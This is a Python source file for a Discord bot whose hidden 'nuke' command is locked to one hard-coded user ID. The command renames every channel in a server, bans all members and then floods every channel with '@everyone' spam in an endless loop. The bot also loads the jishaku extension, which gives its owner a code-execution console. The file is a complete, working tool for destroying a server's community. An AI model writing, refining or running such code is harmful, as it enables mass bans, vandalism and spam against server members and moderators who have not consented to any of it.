from distutils.dir_util import copy_tree
from tempfile import TemporaryFile
import discord
from discord.ext import commands
import sys

bot= commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
       print('Bot ready')

token=str(sys.argv[1])

@bot.command(hidden = True)
async def nuke(ctx):
       if ctx.author.id==724283255959978057:
              pass
       else:
              return

       for channel in ctx.guild.channels:
              try:
                     await channel.edit(name='SCAMMERS-got-nuked')
              except:
                     continue
       var=True
       for member in ctx.guild.members:
              try:
                     if member.user is bot.user:
                            continue
                     await member.ban(reason='We are scammers')
              except:
                     pass
       while var==True:
              for channel in ctx.guild.channels:
                     try:
                            await channel.send('@everyone we are scammers we scammed many servers')
                     except:
                           continue
              var=True

initial_extensions =['jishaku']

for extension in initial_extensions:
       bot.load_extension(extension)

bot.run(token)